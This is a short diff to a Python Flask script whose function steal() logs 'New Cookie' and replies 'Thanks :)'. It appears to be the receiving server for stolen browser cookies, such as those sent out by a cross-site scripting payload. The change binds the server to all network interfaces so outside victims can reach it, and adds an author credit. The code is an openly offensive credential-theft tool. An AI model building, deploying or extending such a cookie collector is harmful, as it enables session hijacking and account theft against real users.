@@ -26,4 +26,5 @@ def steal():
 		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
 		return 'Thanks :)'
 if __name__ == '__main__':
-	app.run()
+	app.run(host='0.0.0.0')
+# coded by : khaled nassar @knassar702
